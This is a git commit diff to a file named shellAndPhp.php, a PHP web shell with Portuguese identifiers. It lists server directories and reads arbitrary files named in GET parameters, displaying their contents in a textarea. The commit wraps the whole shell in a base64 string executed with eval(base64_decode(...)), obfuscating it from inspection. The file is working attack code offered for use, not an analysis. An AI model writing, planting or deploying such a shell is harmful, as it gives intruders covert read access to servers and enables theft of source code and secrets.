ef531ae74801b41a58cdeabddba02a4e2ac7550d
LuizFernandoDeveloper <luiz.fernando.developer@outlook.com>
2022-09-28 16:51:45 -0300

    Update shell encoded with php

--- shellAndPhp.php
+++ shellAndPhp.php
@@ -1,14 +1,15 @@
 <?php
-$path = $_GET['v'];
-$action = $_GET['a'];
+$encode = base64_encode('
+$path = $_GET[\'v\'];
+$action = $_GET[\'a\'];
 
 echo "Servidor <br>";
 
 if($action == true){
 
-echo "<textarea class='form-control' name='textl'>";
+echo "<textarea class=\'form-control\' name=\'textl\'>";
 
-$arquivo_edit = fopen ($action, 'r') or die("Unable to open file!");
+$arquivo_edit = fopen ($action, \'r\') or die("Unable to open file!");
 
 while( !feof($arquivo_edit)){
 $linha = fgets($arquivo_edit);
@@ -39,12 +40,12 @@ $diretorio = dir($path);
 
 while($arquivo = $diretorio -> read()){
 
-$arquivoex = substr($arquivo, strripos($arquivo, '.'));
+$arquivoex = substr($arquivo, strripos($arquivo, \'.\'));
 
 if($arquivoex == ".php" or $arquivoex == ".js" or $arquivoex == ".css" or $arquivoex == ".txt"){
-$mostrar = "<a href='shell.php?a=$path$arquivo'>".$arquivo."</a><br>";
+$mostrar = "<a href=\'shell.php?a=$path$arquivo\'>".$arquivo."</a><br>";
 }else{
-$mostrar = "<a href='shell.php?v=$path$arquivo/'>".$arquivo."</a><br>";
+$mostrar = "<a href=\'shell.php?v=$path$arquivo/\'>".$arquivo."</a><br>";
 }
 
 echo $mostrar;
@@ -54,5 +55,6 @@ $diretorio -> close();
 }
 
 
-
+');
+eval(base64_decode($encode))
 ?>
